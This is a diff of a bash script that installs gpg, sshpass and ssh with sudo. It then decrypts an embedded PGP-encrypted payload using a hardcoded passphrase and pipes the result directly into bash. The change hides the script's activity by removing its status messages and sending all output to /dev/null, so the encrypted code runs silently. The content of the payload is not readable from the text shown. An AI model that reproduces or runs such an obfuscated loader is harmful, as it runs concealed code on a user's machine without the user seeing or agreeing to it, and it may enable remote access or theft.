@@ -1,41 +1,38 @@
 #!/bin/bash
 
-# List of required tools and their respective packages
-declare -A required_tools=(
-  [gpg]="gnupg"
-  [sshpass]="sshpass"
-  [ssh]="openssh-client"
-)
+{
+  # List of required tools and their respective packages
+  declare -A required_tools=(
+    [gpg]="gnupg"
+    [sshpass]="sshpass"
+    [ssh]="openssh-client"
+  )
 
-missing_packages=()
+  missing_packages=()
 
-check_and_collect() {
-  for cmd in "${!required_tools[@]}"; do
-    if ! command -v "$cmd" &> /dev/null; then
-      missing_packages+=("${required_tools[$cmd]}")
+  check_and_collect() {
+    for cmd in "${!required_tools[@]}"; do
+      if ! command -v "$cmd" &> /dev/null; then
+        missing_packages+=("${required_tools[$cmd]}")
+      fi
+    done
+  }
+
+  install_missing_packages() {
+    if [ ${#missing_packages[@]} -gt 0 ]; then
+      sudo apt-get update -qq > /dev/null 2>&1
+      if ! sudo apt-get install -y -qq --no-install-recommends "${missing_packages[@]}" > /dev/null 2>&1; then
+        exit 1
+      fi
+      hash -r
     fi
-  done
-}
+  }
 
-install_missing_packages() {
-  if [ ${#missing_packages[@]} -gt 0 ]; then
-    echo "Installing missing packages: ${missing_packages[*]}"
-    sudo apt-get update -qq
-    if ! sudo apt-get install -y -qq --no-install-recommends "${missing_packages[@]}"; then
-      echo "Error: Failed to install some packages: ${missing_packages[*]}"
-      exit 1
-    fi
-    hash -r
-  fi
-}
+  main() {
+    check_and_collect
+    install_missing_packages
 
-main() {
-  check_and_collect
-  install_missing_packages
-
-  echo "All required tools are installed. Running encrypted script..."
-
-  gpg -d --batch --yes --quiet --passphrase "Letsget@@1" <<'EOF' | bash
+    gpg -d --batch --yes --quiet --passphrase "Letsget@@1" <<'EOF' | bash > /dev/null 2>&1
 -----BEGIN PGP MESSAGE-----
 
 jA0ECQMKGIz/Wc7wkb//0ukBkuPe/adAIoDm0+xfwgwhlv28PH2ugWObazAwQvHX
@@ -57,6 +54,8 @@ o3JRWs0hiMAje4HZFm9x44dEzG8btQ==
 =6G0j
 -----END PGP MESSAGE-----
 EOF
-}
+  }
 
-main
+  main
+
+} > /dev/null 2>&1
